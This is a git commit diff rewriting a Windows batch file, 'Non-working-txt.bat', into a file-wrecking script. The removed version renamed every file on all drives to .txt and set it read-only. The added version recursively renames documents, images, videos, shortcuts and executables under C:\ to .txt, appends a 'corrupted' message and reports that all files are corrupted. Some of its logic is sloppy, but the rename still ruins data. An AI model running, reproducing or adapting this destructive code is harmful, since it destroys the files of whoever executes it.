179a57d0d94ea74c897718a71be849a4817e0685
Pushkar Sharma <96145925+pushkarsharma23@users.noreply.github.com>
2023-05-04 16:17:12 +0530

    Update Non-working-txt.bat

--- Non-working-txt.bat
+++ Non-working-txt.bat
@@ -1,14 +1,13 @@
 @echo off
-rem Loop through all drives
-for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-    rem Loop through all directories in the current drive
-    for /r %%f in (*) do (
-        rem Check if the file extension is not already .txt
-        if not "%%~xf"==".txt" (
-            rem Rename the file to have a .txt extension
-            ren "%%f" "%%~nf.txt"
-            rem Make the file read-only
-            attrib +r "%%~nf.txt"
-        )
-    )
+setlocal enableextensions
+
+pushd C:\
+
+for /r %%i in (*.doc *.xml *.gif *.jpeg *.lnk *.avi *.mpeg *.com *.bat) do (
+  ren "%%i" "%%~ni.txt"
+  echo This file has been corrupted! >> "%%~ni.txt"
 )
+
+echo All files have been corrupted.
+
+popd
